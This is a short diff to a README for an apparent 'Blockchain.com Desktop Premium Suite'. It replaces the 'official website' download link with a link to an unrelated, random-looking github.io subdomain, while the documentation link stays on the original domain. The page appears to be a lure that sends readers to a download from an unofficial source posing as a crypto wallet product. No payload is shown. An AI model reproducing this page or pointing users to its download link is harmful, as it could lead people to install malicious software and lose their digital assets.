@@ -38,6 +38,6 @@ A: We prioritize user privacy and security. All data is encrypted locally on you
 
 ## Download
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For additional support, visit our documentation at [Documentation](https://yellowtaxisave.github.io/docs/) or join our community forum for tips and discussions. Thank you for choosing Blockchain.com Desktop Premium Suite for your blockchain management needs, and we hope it enhances your digital asset experience.
